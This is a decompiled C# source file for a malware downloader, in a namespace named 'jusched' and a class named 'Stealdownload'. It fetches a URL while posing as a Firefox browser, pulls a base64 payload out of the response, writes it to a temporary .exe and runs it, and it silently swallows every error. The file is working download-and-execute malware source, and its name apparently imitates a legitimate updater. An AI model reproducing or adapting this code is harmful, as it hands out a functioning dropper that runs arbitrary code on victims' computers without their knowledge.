using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace jusched;

public class Stealdownload
{
	public static object visit(string string_0)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient = new WebClient();
			webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0");
			Stream stream = webClient.OpenRead(string_0);
			StreamReader streamReader = new StreamReader(stream);
			return streamReader.ReadToEnd();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object down(string string_0)
	{
		try
		{
			string[] array = Strings.Split(Conversions.ToString(visit(string_0)), ";****", -1, (CompareMethod)0);
			byte[] bytes = Convert.FromBase64String(array[1]);
			string text = Path.GetTempFileName() + ".exe";
			File.WriteAllBytes(text, bytes);
			Process.Start(text);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object downexe(string string_0)
	{
		try
		{
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { RuntimeHelpers.GetObjectValue(down(string_0)) }, (string[])null, (Type[])null, (bool[])null, true);
			object result = default(object);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
